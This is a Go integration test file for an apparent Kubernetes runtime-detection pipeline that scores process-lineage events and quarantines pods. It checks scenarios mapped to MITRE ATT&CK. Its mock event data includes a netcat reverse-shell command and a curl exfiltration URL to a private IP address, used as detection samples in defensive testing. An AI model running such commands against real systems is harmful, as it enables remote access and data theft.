package integration_test

import (
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"github.com/executeid/ztre/pkg/collector"
	"github.com/executeid/ztre/pkg/containment"
	"github.com/executeid/ztre/pkg/decision"
	"github.com/executeid/ztre/pkg/discovery"
	"github.com/executeid/ztre/pkg/observability"
	"github.com/executeid/ztre/pkg/risk"
	"github.com/executeid/ztre/pkg/validator"
	"github.com/executeid/ztre/tests/testutil"
	"go.uber.org/zap"
	"google.golang.org/grpc"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes/fake"
)

func TestEndToEndPipeline_Stage1To4(t *testing.T) {
	tempDir := t.TempDir()
	sockPath := filepath.Join(tempDir, "tetragon.sock")

	// 1. Stage 1/2: Start real Unix domain socket Tetragon gRPC Server
	lis, err := net.Listen("unix", sockPath)
	if err != nil {
		t.Fatalf("failed to listen on unix socket: %v", err)
	}
	defer lis.Close()

	grpcServer := grpc.NewServer()
	mockServer := testutil.NewMockTetragonServer()
	tetragon.RegisterFineGuidanceSensorsServer(grpcServer, mockServer)

	go func() {
		_ = grpcServer.Serve(lis)
	}()
	defer grpcServer.Stop()

	logger, _ := zap.NewDevelopment()
	defer logger.Sync() //nolint:errcheck

	// Prepare mock events
	// Event 1: Legitimate nginx worker fork (Stage 2.5 pattern + Stage 3 NORMAL)
	ev1 := testutil.NewTetragonExecResponse("/usr/sbin/nginx", "/usr/sbin/nginx", "frontend", "web", "worker-1")
	// Event 2: Legitimate shell inside container (Stage 3 NORMAL via manual override)
	ev2 := testutil.NewTetragonExecResponse("/usr/sbin/nginx", "/bin/sh", "frontend", "web", "worker-1")
	// Event 3: Unknown binary running curl (Stage 3 SUSPICIOUS, YELLOW zone)
	ev3 := testutil.NewTetragonExecResponseWithArgs("/usr/local/bin/custom-app", "/usr/bin/curl", "http://internal.service", "frontend", "web", "worker-1")
	// Event 4: RCE / Bash spawn from nginx in database namespace (Stage 3 ANOMALOUS, RED zone)
	ev4 := testutil.NewTetragonExecResponse("/usr/sbin/nginx", "/bin/bash", "database", "pg-db", "worker-1")
	// Event 5: Reverse shell Netcat invocation (Stage 3 ANOMALOUS, RED zone, Max 100)
	ev5 := testutil.NewTetragonExecResponseWithArgs("/usr/sbin/nginx", "/bin/nc", "-e /bin/sh 10.91.128.10 4444", "database", "pg-db", "worker-1")
	// Event 6: Non-execve event (exit event, should be tracked but not classified)
	ev6 := testutil.NewTetragonExitResponse("/usr/bin/whoami", "frontend", "web", "worker-1")

	mockServer.SetResponses([]*tetragon.GetEventsResponse{ev1, ev2, ev3, ev4, ev5, ev6})

	// 2. Stage 2: Initialize EventBuffer and Client
	eventBuffer := collector.NewEventBuffer(1000, logger)
	clientConfig := collector.ClientConfig{
		SocketPath:          sockPath,
		ReconnectInterval:   100 * time.Millisecond,
		MaxReconnectBackoff: 500 * time.Millisecond,
	}
	client := collector.NewClient(clientConfig, eventBuffer, logger)

	clientCtx, clientCancel := context.WithCancel(context.Background())
	defer clientCancel()

	clientErrCh := make(chan error, 1)
	go func() {
		clientErrCh <- client.Start(clientCtx)
	}()

	// 3. Stage 2.5: Initialize Behavioral Discovery Engine
	discoveryDir := filepath.Join(tempDir, "discovery")
	if err := os.MkdirAll(discoveryDir, 0o755); err != nil {
		t.Fatalf("failed to create discovery dir: %v", err)
	}

	tracker := discovery.NewBehaviorTracker(logger)
	baselineStore := discovery.NewBaselineStore(
		tracker,
		discoveryDir,
		1*time.Hour,
		4*time.Hour,
		logger,
	)
	reporter := discovery.NewBaselineReporter(tracker, baselineStore, logger)

	// 4. Stage 3: Setup Whitelist and Risk Engine Policies
	manualWhitelistPath := filepath.Join(tempDir, "manual_whitelist.yaml")
	manualWlContent := `
whitelisted_lineages:
  - parent: nginx
    allowed_children:
      - nginx
      - sh
`
	if err := os.WriteFile(manualWhitelistPath, []byte(manualWlContent), 0o644); err != nil {
		t.Fatalf("failed to write manual whitelist: %v", err)
	}

	autoWhitelistPath := filepath.Join(discoveryDir, "auto_whitelist.yaml")
	if err := os.WriteFile(autoWhitelistPath, []byte("whitelisted_lineages: []"), 0o644); err != nil {
		t.Fatalf("failed to write auto whitelist: %v", err)
	}

	whitelist, err := validator.NewWhitelist(autoWhitelistPath, logger)
	if err != nil {
		t.Fatalf("failed to create whitelist: %v", err)
	}
	if err := whitelist.LoadMulti(manualWhitelistPath); err != nil {
		t.Fatalf("failed to load manual whitelist: %v", err)
	}

	riskPolicyPath := filepath.Join(tempDir, "risk_policy.yaml")
	riskPolicyContent := `
weights:
  severity: 0.50
  context: 0.30
  asset_criticality: 0.20

severity_scores:
  reverse_shell: 100
  chmod_suid: 90
  curl_download: 80
  bash_spawn: 70
  file_write_etc: 60
  default: 20

context_scores:
  NORMAL: 0
  SUSPICIOUS: 50
  ANOMALOUS: 100

asset_criticality:
  critical:
    namespaces: [database]
    score: 100
  high:
    namespaces: [api]
    score: 75
  medium:
    namespaces: [backend]
    score: 50
  low:
    namespaces: [frontend]
    score: 25
  default_score: 50
`
	if err := os.WriteFile(riskPolicyPath, []byte(riskPolicyContent), 0o644); err != nil {
		t.Fatalf("failed to write risk policy: %v", err)
	}

	riskEngine, err := risk.NewEngine(riskPolicyPath, logger)
	if err != nil {
		t.Fatalf("failed to create risk engine: %v", err)
	}

	// 5. Stage 4: Initialize Decision Engine, Alert Dispatcher & Containment Executor
	decisionEngine := decision.NewEngine(decision.DefaultThresholds(), logger)

	// In-memory mock alert sink
	dispatchedAlerts := make([]decision.Alert, 0)
	alertSink := &mockSink{onSend: func(al decision.Alert) {
		dispatchedAlerts = append(dispatchedAlerts, al)
	}}
	alertDispatcher := decision.NewDispatcher(logger, alertSink)

	// Mock Kubernetes Client with the target pods
	frontendPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "web-pod-xyz",
			Namespace: "frontend",
			Labels:    map[string]string{"app": "frontend"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	databasePod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "pg-db-pod-xyz",
			Namespace: "database",
			Labels:    map[string]string{"app": "database"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	fakeK8s := fake.NewSimpleClientset(frontendPod, databasePod)
	containmentExecutor := containment.NewExecutor(fakeK8s, logger)

	// 6. Ingest & Process Events end-to-end
	type ProcessResult struct {
		Event          *collector.SecurityEvent
		Classification validator.Classification
		RiskScore      *risk.RiskScore
		Action         decision.Action
	}

	results := make([]ProcessResult, 0)
	timeout := time.After(3 * time.Second)

	// Collect 6 events from buffer
	for len(results) < 6 {
		select {
		case ev := <-eventBuffer.Events():
			// Track in discovery
			tracker.Track(ev)
			observability.DiscoveryEventsTotal.Inc()

			if ev.EventType != collector.EventTypeExecve {
				results = append(results, ProcessResult{
					Event: ev,
				})
				continue
			}

			// Validate lineage
			class := whitelist.Classify(ev.ParentBinary, ev.Binary)
			observability.EventsClassifiedTotal.WithLabelValues(string(class)).Inc()

			res := ProcessResult{
				Event:          ev,
				Classification: class,
			}

			if class != validator.ClassNormal {
				score := riskEngine.Calculate(ev, class)
				observability.RiskScoreHistogram.Observe(score.TotalScore)
				action := decisionEngine.EvaluateRiskScore(score)

				alert := decision.NewAlert(
					fmt.Sprintf("%s-%d", ev.PodName, ev.PID),
					ev.Namespace,
					ev.PodName,
					ev.ParentBinary,
					ev.Binary,
					ev.Arguments,
					class,
					score,
					action,
				)

				// Stage 4 Action routing
				switch action {
				case decision.ActionLogAndAlert:
					alertDispatcher.Dispatch(context.Background(), alert)
				case decision.ActionAutoContainment:
					alertDispatcher.Dispatch(context.Background(), alert)
					if err := containmentExecutor.Quarantine(context.Background(), ev.Namespace, ev.PodName, score.TotalScore); err != nil {
						t.Errorf("quarantine failed for %s/%s: %v", ev.Namespace, ev.PodName, err)
					}
				}

				res.RiskScore = &score
				res.Action = action
			}
			results = append(results, res)

		case <-timeout:
			t.Fatalf("timed out waiting for events, received %d of 6", len(results))
		}
	}

	// 7. Verify Results from all stages (1, 2, 2.5, 3, 4)

	// Event 1: nginx -> nginx (NORMAL -> ALLOW_AND_LOG)
	if results[0].Classification != validator.ClassNormal {
		t.Errorf("ev1: expected ClassNormal, got %s", results[0].Classification)
	}

	// Event 2: nginx -> sh (NORMAL via manual whitelist -> ALLOW_AND_LOG)
	if results[1].Classification != validator.ClassNormal {
		t.Errorf("ev2: expected ClassNormal, got %s", results[1].Classification)
	}

	// Event 3: custom-app -> curl in frontend (SUSPICIOUS -> Score 60 -> LOG_AND_ALERT)
	if results[2].Classification != validator.ClassSuspicious {
		t.Errorf("ev3: expected ClassSuspicious, got %s", results[2].Classification)
	}
	if results[2].Action != decision.ActionLogAndAlert {
		t.Errorf("ev3: expected LOG_AND_ALERT, got %s", results[2].Action)
	}
	if results[2].RiskScore.TotalScore != 60 {
		t.Errorf("ev3: expected risk score 60, got %.1f", results[2].RiskScore.TotalScore)
	}

	// Event 4: nginx -> bash in database (ANOMALOUS -> Score 85 -> AUTO_CONTAINMENT)
	if results[3].Classification != validator.ClassAnomalous {
		t.Errorf("ev4: expected ClassAnomalous, got %s", results[3].Classification)
	}
	if results[3].Action != decision.ActionAutoContainment {
		t.Errorf("ev4: expected AUTO_CONTAINMENT, got %s", results[3].Action)
	}

	// Event 5: Reverse Shell Netcat in database (ANOMALOUS -> Score 100 -> AUTO_CONTAINMENT)
	if results[4].Classification != validator.ClassAnomalous {
		t.Errorf("ev5: expected ClassAnomalous, got %s", results[4].Classification)
	}
	if results[4].Action != decision.ActionAutoContainment {
		t.Errorf("ev5: expected AUTO_CONTAINMENT, got %s", results[4].Action)
	}

	// 8. Verify Stage 4 Automated Containment on Kubernetes Pods
	// The database pod (pg-db-pod-xyz) MUST have ztre/quarantine: "true"
	updatedDbPod, err := fakeK8s.CoreV1().Pods("database").Get(context.Background(), "pg-db-pod-xyz", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("failed to get database pod: %v", err)
	}
	if val, ok := updatedDbPod.Labels[containment.QuarantineLabelKey]; !ok || val != containment.QuarantineLabelValue {
		t.Errorf("expected pod pg-db-pod-xyz to have label %s=%s, got %s (exists=%v)",
			containment.QuarantineLabelKey, containment.QuarantineLabelValue, val, ok)
	}

	// The frontend pod (web-pod-xyz) MUST NOT have quarantine label (only curl alert, no containment)
	updatedFrontendPod, err := fakeK8s.CoreV1().Pods("frontend").Get(context.Background(), "web-pod-xyz", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("failed to get frontend pod: %v", err)
	}
	if _, ok := updatedFrontendPod.Labels[containment.QuarantineLabelKey]; ok {
		t.Errorf("frontend pod web-pod-xyz should NOT have quarantine label!")
	}

	// 9. Verify Stage 4 Alert Dispatcher
	// We expect 3 dispatched alerts: ev3 (YELLOW alert), ev4 (RED alert), ev5 (RED alert)
	if len(dispatchedAlerts) != 3 {
		t.Errorf("expected 3 dispatched alerts, got %d", len(dispatchedAlerts))
	}

	// 10. Verify Discovery State & Persistence
	if tracker.TotalEvents() != 6 {
		t.Errorf("expected 6 total events tracked, got %d", tracker.TotalEvents())
	}
	if tracker.UniquePatternCount() != 5 {
		t.Errorf("expected 5 unique execve patterns, got %d", tracker.UniquePatternCount())
	}

	// Save snapshot to disk
	if err := baselineStore.SaveSnapshot(); err != nil {
		t.Fatalf("failed to save baseline snapshot: %v", err)
	}

	if err := reporter.WriteReport(discoveryDir); err != nil {
		t.Fatalf("failed to write baseline report: %v", err)
	}

	// 11. Test Clean Client Shutdown
	clientCancel()
	eventBuffer.Close()

	select {
	case err := <-clientErrCh:
		if err != nil {
			t.Errorf("client stopped with unexpected error: %v", err)
		}
	case <-time.After(1 * time.Second):
		t.Errorf("client did not stop cleanly on context cancel")
	}

	fmt.Println(">> Integrated End-to-End Pipeline (Stages 1, 2, 2.5, 3, 4): 100% PASSED")
}

type mockSink struct {
	onSend func(decision.Alert)
}

func (m *mockSink) Name() string { return "mock" }
func (m *mockSink) Send(_ context.Context, alert decision.Alert) error {
	if m.onSend != nil {
		m.onSend(alert)
	}
	return nil
}

// TestEndToEndPipeline_Stage5_MITRE_T1ToT6_Evaluation validates all MITRE ATT&CK
// scenarios T1 through T6 defined in doc/STAGE_5_EXPLAINED.md and computes metrics M1, M2, and M4.
func TestEndToEndPipeline_Stage5_MITRE_T1ToT6_Evaluation(t *testing.T) {
	tempDir := t.TempDir()
	sockPath := filepath.Join(tempDir, "tetragon_stage5.sock")

	lis, err := net.Listen("unix", sockPath)
	if err != nil {
		t.Fatalf("failed to listen on unix socket: %v", err)
	}
	defer lis.Close()

	grpcServer := grpc.NewServer()
	mockServer := testutil.NewMockTetragonServer()
	tetragon.RegisterFineGuidanceSensorsServer(grpcServer, mockServer)
	go func() {
		_ = grpcServer.Serve(lis)
	}()
	defer grpcServer.Stop()

	logger, _ := zap.NewDevelopment()
	defer logger.Sync() //nolint:errcheck

	// Mock Kubernetes Workload Pods across 3 tiers (frontend, api, database)
	frontendPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "web-pod-xyz",
			Namespace: "frontend",
			Labels:    map[string]string{"app": "frontend"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	apiPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "api-pod-xyz",
			Namespace: "api",
			Labels:    map[string]string{"app": "api"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	databasePod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "pg-db-pod-xyz",
			Namespace: "database",
			Labels:    map[string]string{"app": "database"},
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	fakeK8s := fake.NewSimpleClientset(frontendPod, apiPod, databasePod)
	containmentExecutor := containment.NewExecutor(fakeK8s, logger)

	// Prepare mock events corresponding to Stage 5 Scenarios T1-T6
	var rawEvents []*tetragon.GetEventsResponse

	// T1: RCE / Bash Spawn from Nginx (T1059.004) in database
	t1 := testutil.NewTetragonExecResponseWithArgs("/usr/sbin/nginx", "/bin/bash", "sh -c \"sleep 0.5\"", "database", "pg-db", "worker-1")
	rawEvents = append(rawEvents, t1)

	// T2: Data Exfiltration via curl (T1041) in api
	t2 := testutil.NewTetragonExecResponseWithArgs("/usr/sbin/nginx", "/usr/bin/curl", "http://10.91.128.10:9999/exfil", "api", "api", "worker-1")
	rawEvents = append(rawEvents, t2)

	// T3: Reverse Shell via Netcat (T1059 + T1571) in database
	t3 := testutil.NewTetragonExecResponseWithArgs("/usr/sbin/nginx", "/bin/nc", "-e /bin/sh 10.91.128.10 4444", "database", "pg-db", "worker-1")
	rawEvents = append(rawEvents, t3)

	// T4: Legitimate Web Worker Process Forks (10 repetitions)
	for i := 0; i < 10; i++ {
		t4 := testutil.NewTetragonExecResponseWithArgs("/usr/sbin/nginx", "/usr/sbin/nginx", "worker process", "frontend", "web", "worker-1")
		rawEvents = append(rawEvents, t4)
	}

	// T6: Low-Risk Utility ls Execution in frontend
	t6 := testutil.NewTetragonExecResponseWithArgs("/tmp/worker-helper", "/bin/ls", "-la /tmp", "frontend", "web", "worker-1")
	rawEvents = append(rawEvents, t6)

	mockServer.SetResponses(rawEvents)

	// Collector buffer and client
	eventBuffer := collector.NewEventBuffer(100, logger)
	clientConfig := collector.ClientConfig{
		SocketPath:          sockPath,
		ReconnectInterval:   50 * time.Millisecond,
		MaxReconnectBackoff: 200 * time.Millisecond,
	}
	client := collector.NewClient(clientConfig, eventBuffer, logger)
	clientCtx, clientCancel := context.WithCancel(context.Background())
	defer clientCancel()
	go func() {
		_ = client.Start(clientCtx)
	}()

	// Stage 3: Whitelist & Risk Policies
	autoWlPath := filepath.Join(tempDir, "auto_wl.yaml")
	if err := os.WriteFile(autoWlPath, []byte("whitelisted_lineages:\n  - parent: nginx\n    allowed_children:\n      - nginx\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	whitelist, err := validator.NewWhitelist(autoWlPath, logger)
	if err != nil {
		t.Fatal(err)
	}

	riskPolicyPath := filepath.Join(tempDir, "risk_policy.yaml")
	riskPolicyContent := `
weights:
  severity: 0.50
  context: 0.30
  asset_criticality: 0.20
severity_scores:
  reverse_shell: 100
  chmod_suid: 90
  curl_download: 80
  bash_spawn: 70
  file_write_etc: 60
  default: 20
context_scores:
  NORMAL: 0
  SUSPICIOUS: 50
  ANOMALOUS: 100
asset_criticality:
  critical:
    namespaces: [database]
    score: 100
  high:
    namespaces: [api]
    score: 75
  medium:
    namespaces: [backend]
    score: 50
  low:
    namespaces: [frontend]
    score: 25
  default_score: 50
`
	if err := os.WriteFile(riskPolicyPath, []byte(riskPolicyContent), 0o644); err != nil {
		t.Fatal(err)
	}
	riskEngine, err := risk.NewEngine(riskPolicyPath, logger)
	if err != nil {
		t.Fatal(err)
	}

	decisionEngine := decision.NewEngine(decision.ThresholdConfig{GreenMax: 39, YellowMax: 69}, logger)
	var dispatchedAlerts []decision.Alert
	dispatcher := decision.NewDispatcher(logger, &mockSink{onSend: func(a decision.Alert) {
		dispatchedAlerts = append(dispatchedAlerts, a)
	}})

	// Ingest and evaluate all 14 events
	type EventResult struct {
		Event  *collector.SecurityEvent
		Class  validator.Classification
		Score  float64
		Action decision.Action
	}
	results := make([]EventResult, 0)
	timeout := time.After(3 * time.Second)

	for len(results) < len(rawEvents) {
		select {
		case ev := <-eventBuffer.Events():
			class := whitelist.Classify(ev.ParentBinary, ev.Binary)
			res := EventResult{Event: ev, Class: class}
			if class != validator.ClassNormal {
				score := riskEngine.Calculate(ev, class)
				action := decisionEngine.EvaluateRiskScore(score)
				res.Score = score.TotalScore
				res.Action = action

				alert := decision.NewAlert(
					fmt.Sprintf("%s-%d", ev.PodName, ev.PID),
					ev.Namespace, ev.PodName, ev.ParentBinary, ev.Binary, ev.Arguments,
					class, score, action,
				)

				switch action {
				case decision.ActionLogAndAlert:
					dispatcher.Dispatch(context.Background(), alert)
				case decision.ActionAutoContainment:
					dispatcher.Dispatch(context.Background(), alert)
					if err := containmentExecutor.Quarantine(context.Background(), ev.Namespace, ev.PodName, score.TotalScore); err != nil {
						t.Errorf("quarantine failed for %s/%s: %v", ev.Namespace, ev.PodName, err)
					}
				}
			} else {
				res.Action = decision.ActionAllowAndLog
			}
			results = append(results, res)
		case <-timeout:
			t.Fatalf("timed out waiting for events, received %d of %d", len(results), len(rawEvents))
		}
	}

	// 1. Verify T1 (RCE Bash spawn in database)
	if results[0].Class != validator.ClassAnomalous || results[0].Score != 85 || results[0].Action != decision.ActionAutoContainment {
		t.Errorf("T1 failed: Class=%s Score=%.1f Action=%s (expected ANOMALOUS, 85, AUTO_CONTAINMENT)",
			results[0].Class, results[0].Score, results[0].Action)
	}

	// 2. Verify T2 (Data Exfiltration curl in api)
	// S=80*0.5=40, C=100*0.3=30, A=75*0.2=15 -> Total=85
	if results[1].Class != validator.ClassAnomalous || results[1].Score != 85 || results[1].Action != decision.ActionAutoContainment {
		t.Errorf("T2 failed: Class=%s Score=%.1f Action=%s (expected ANOMALOUS, 85, AUTO_CONTAINMENT)",
			results[1].Class, results[1].Score, results[1].Action)
	}

	// 3. Verify T3 (Reverse Shell nc in database)
	// S=100*0.5=50, C=100*0.3=30, A=100*0.2=20 -> Total=100
	if results[2].Class != validator.ClassAnomalous || results[2].Score != 100 || results[2].Action != decision.ActionAutoContainment {
		t.Errorf("T3 failed: Class=%s Score=%.1f Action=%s (expected ANOMALOUS, 100, AUTO_CONTAINMENT)",
			results[2].Class, results[2].Score, results[2].Action)
	}

	// 4. Verify T4 (10 legitimate worker forks)
	for i := 3; i < 13; i++ {
		if results[i].Class != validator.ClassNormal || results[i].Action != decision.ActionAllowAndLog {
			t.Errorf("T4 index %d failed: Class=%s Action=%s (expected NORMAL, ALLOW_AND_LOG)",
				i, results[i].Class, results[i].Action)
		}
	}

	// 5. Verify T6 (Low-risk utility ls execution in frontend)
	// S=20*0.5=10, C=50*0.3=15, A=25*0.2=5 -> Total=30 -> GREEN -> ALLOW_AND_LOG
	if results[13].Class != validator.ClassSuspicious || results[13].Score != 30 || results[13].Action != decision.ActionAllowAndLog {
		t.Errorf("T6 failed: Class=%s Score=%.1f Action=%s (expected SUSPICIOUS, 30, ALLOW_AND_LOG)",
			results[13].Class, results[13].Score, results[13].Action)
	}

	// 6. Verify Non-Destructive Containment (T5) & Metric M4 (Preservation of Container State)
	// Compromised Pods (database and api) MUST have quarantine label applied
	dbPod, err := fakeK8s.CoreV1().Pods("database").Get(context.Background(), "pg-db-pod-xyz", metav1.GetOptions{})
	if err != nil || dbPod.Labels[containment.QuarantineLabelKey] != containment.QuarantineLabelValue {
		t.Errorf("database pod should have quarantine label, err: %v, labels: %v", err, dbPod.Labels)
	}
	if dbPod.Status.Phase != corev1.PodRunning {
		t.Errorf("database pod phase should remain PodRunning, got %s", dbPod.Status.Phase)
	}

	targetApiPod, err := fakeK8s.CoreV1().Pods("api").Get(context.Background(), "api-pod-xyz", metav1.GetOptions{})
	if err != nil || targetApiPod.Labels[containment.QuarantineLabelKey] != containment.QuarantineLabelValue {
		t.Errorf("api pod should have quarantine label, err: %v, labels: %v", err, targetApiPod.Labels)
	}
	if targetApiPod.Status.Phase != corev1.PodRunning {
		t.Errorf("api pod phase should remain PodRunning, got %s", targetApiPod.Status.Phase)
	}

	// Frontend Pod MUST NOT have quarantine label (T4 & T6 legitimate executions)
	frontPod, err := fakeK8s.CoreV1().Pods("frontend").Get(context.Background(), "web-pod-xyz", metav1.GetOptions{})
	if err != nil || frontPod.Labels[containment.QuarantineLabelKey] != "" {
		t.Errorf("frontend pod must NOT have quarantine label, got %s", frontPod.Labels[containment.QuarantineLabelKey])
	}

	// 7. Verify Metric M1 (Detection Accuracy) and M2 (False Positive Rate)
	trueThreats := 3       // T1, T2, T3
	detectedThreats := 0
	legitimateExecutions := 11 // 10 x T4 + 1 x T6
	falsePositives := 0

	for _, r := range results {
		if r.Action == decision.ActionAutoContainment {
			detectedThreats++
		}
	}
	for i := 3; i < 14; i++ {
		if results[i].Action == decision.ActionAutoContainment {
			falsePositives++
		}
	}

	m1Accuracy := float64(detectedThreats) / float64(trueThreats) * 100.0
	m2FPR := float64(falsePositives) / float64(legitimateExecutions) * 100.0

	if m1Accuracy != 100.0 {
		t.Errorf("Metric M1 Detection Accuracy: expected 100.0%%, got %.2f%%", m1Accuracy)
	}
	if m2FPR != 0.0 {
		t.Errorf("Metric M2 False Positive Rate: expected 0.0%%, got %.2f%%", m2FPR)
	}

	t.Logf("Stage 5 MITRE ATT&CK Evaluation: M1 Accuracy=%.2f%%, M2 FPR=%.2f%%, DispatchedAlerts=%d",
		m1Accuracy, m2FPR, len(dispatchedAlerts))
}

// TestEndToEndPipeline_ConcurrentWorkerPoolAndGracefulDrain validates that
// multi-worker pool consumes concurrently under burst load and drains cleanly during shutdown.
func TestEndToEndPipeline_ConcurrentWorkerPoolAndGracefulDrain(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync() //nolint:errcheck

	buffer := collector.NewEventBuffer(500, logger)
	workerCount := 4
	var wg sync.WaitGroup
	var processedCount int64

	// Stage 3 validator Whitelist
	tempDir := t.TempDir()
	wlPath := filepath.Join(tempDir, "wl.yaml")
	_ = os.WriteFile(wlPath, []byte("whitelisted_lineages: []"), 0o644)
	wl, _ := validator.NewWhitelist(wlPath, logger)

	// Start 4 concurrent workers
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ev := range buffer.Events() {
				_ = wl.Classify(ev.ParentBinary, ev.Binary)
				atomic.AddInt64(&processedCount, 1)
			}
		}()
	}

	// Enqueue burst of 100 events
	totalEvents := 100
	for i := 0; i < totalEvents; i++ {
		ev := &collector.SecurityEvent{
			EventType:    collector.EventTypeExecve,
			ParentBinary: "parent",
			Binary:       fmt.Sprintf("child-%d", i),
			Namespace:    "test",
			PodName:      "test-pod",
		}
		buffer.Push(ev)
	}

	// Graceful shutdown sequence: close buffer and wait for worker pool to drain
	buffer.Close()
	wg.Wait()

	if processedCount != int64(totalEvents) {
		t.Errorf("expected %d events processed after graceful drain, got %d", totalEvents, processedCount)
	}
}

// TestEndToEndPipeline_AgentModes_ShadowAndDiscovery tests ModeShadow and ModeDiscovery.
func TestEndToEndPipeline_AgentModes_ShadowAndDiscovery(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync() //nolint:errcheck

	tempDir := t.TempDir()
	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "target-pod",
			Namespace: "database",
		},
		Status: corev1.PodStatus{Phase: corev1.PodRunning},
	}
	fakeK8s := fake.NewSimpleClientset(pod)
	containmentExecutor := containment.NewExecutor(fakeK8s, logger)

	wlPath := filepath.Join(tempDir, "wl.yaml")
	_ = os.WriteFile(wlPath, []byte("whitelisted_lineages:\n  - parent: nginx\n    allowed_children:\n      - nginx\n"), 0o644)
	whitelist, _ := validator.NewWhitelist(wlPath, logger)

	riskPolicyPath := filepath.Join(tempDir, "risk.yaml")
	policyYAML := `
weights:
  severity: 0.50
  context: 0.30
  asset_criticality: 0.20
severity_scores:
  bash_spawn: 70
  default: 20
context_scores:
  NORMAL: 0
  ANOMALOUS: 100
asset_criticality:
  critical:
    namespaces: [database]
    score: 100
  default_score: 50
`
	_ = os.WriteFile(riskPolicyPath, []byte(policyYAML), 0o644)
	riskEngine, _ := risk.NewEngine(riskPolicyPath, logger)
	decisionEngine := decision.NewEngine(decision.ThresholdConfig{GreenMax: 39, YellowMax: 69}, logger)

	// ModeShadow simulation: an anomalous threat is scored, but ZERO containment is executed
	threatEv := &collector.SecurityEvent{
		EventType:    collector.EventTypeExecve,
		ParentBinary: "nginx",
		Binary:       "bash",
		Namespace:    "database",
		PodName:      "target-pod",
	}

	class := whitelist.Classify(threatEv.ParentBinary, threatEv.Binary)
	score := riskEngine.Calculate(threatEv, class)
	action := decisionEngine.EvaluateRiskScore(score)

	if action != decision.ActionAutoContainment {
		t.Fatalf("expected AUTO_CONTAINMENT in shadow mode, got %s", action)
	}

	// In Shadow Mode, containment executor is NOT called
	observability.ShadowDecisionsTotal.WithLabelValues(string(action)).Inc()

	// Assert target pod label was NOT applied
	targetPod, _ := fakeK8s.CoreV1().Pods("database").Get(context.Background(), "target-pod", metav1.GetOptions{})
	if _, quarantined := targetPod.Labels[containment.QuarantineLabelKey]; quarantined {
		t.Errorf("pod must NOT be quarantined in Shadow Mode")
	}

	_ = containmentExecutor
}

// TestEndToEndPipeline_SIGHUP_HotReload tests dynamic reload of Whitelist.
func TestEndToEndPipeline_SIGHUP_HotReload(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync() //nolint:errcheck

	tempDir := t.TempDir()
	wlPath := filepath.Join(tempDir, "auto_wl.yaml")

	initialWl := `
whitelisted_lineages:
  - parent: nginx
    allowed_children:
      - nginx
`
	if err := os.WriteFile(wlPath, []byte(initialWl), 0o644); err != nil {
		t.Fatal(err)
	}

	wl, err := validator.NewWhitelist(wlPath, logger)
	if err != nil {
		t.Fatal(err)
	}

	// Before reload: nginx -> python3 is ANOMALOUS
	if class := wl.Classify("nginx", "python3"); class != validator.ClassAnomalous {
		t.Fatalf("expected ANOMALOUS before reload, got %s", class)
	}

	// Update whitelist file on disk (simulate SIGHUP after new baseline generated)
	updatedWl := `
whitelisted_lineages:
  - parent: nginx
    allowed_children:
      - nginx
      - python3
`
	if err := os.WriteFile(wlPath, []byte(updatedWl), 0o644); err != nil {
		t.Fatal(err)
	}

	// Reload whitelist
	if err := wl.Load(); err != nil {
		t.Fatalf("failed to reload whitelist: %v", err)
	}

	// After reload: nginx -> python3 is NORMAL
	if class := wl.Classify("nginx", "python3"); class != validator.ClassNormal {
		t.Fatalf("expected NORMAL after SIGHUP reload, got %s", class)
	}
}
